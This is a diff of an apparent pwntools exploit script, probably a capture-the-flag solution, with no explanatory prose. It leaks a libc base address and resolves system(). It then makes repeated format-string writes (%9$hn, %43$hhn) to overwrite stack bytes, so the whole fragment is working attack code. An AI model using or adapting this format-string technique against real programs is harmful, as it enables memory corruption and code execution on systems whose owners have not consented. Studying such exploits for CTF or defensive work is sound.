@@ -19,26 +19,22 @@ io.recvuntil(b'0x')
 base = int(io.recv(12),16) - 0x2a1ca
 
 snd(f"%{empty_stack & 0xffff}c", "%9$hn")
-snd(b"%43$hhn")
-
+snd("%43$hhn")
 snd(f"%{(empty_stack & 0xffff) + 1}c", "%9$hn")
-snd(b"%64c%43$hhn")
-
+snd("%64c%43$hhn")
 snd(f"%{(empty_stack & 0xffff) + 2}c", "%9$hn")
-snd(b"%64c%43$hhn")
+snd("%64c%43$hhn")
 
 system = base + libc.sym.system
 
 empty_stack += 8
 
 snd(f"%{empty_stack & 0xffff}c", "%9$hn")
-snd(b"%c%43$hhn")
-
+snd("%1c%43$hhn")
 snd(f"%{(empty_stack & 0xffff) + 1}c", "%9$hn")
-snd(b"%64c%43$hhn")
-
+snd("%64c%43$hhn")
 snd(f"%{(empty_stack & 0xffff) + 2}c", "%9$hn")
-snd(b"%64c%43$hhn")
+snd("%64c%43$hhn")
 
 t1 = (system >> 0) & 0xff
 t2 = (system >> 8) & 0xffff
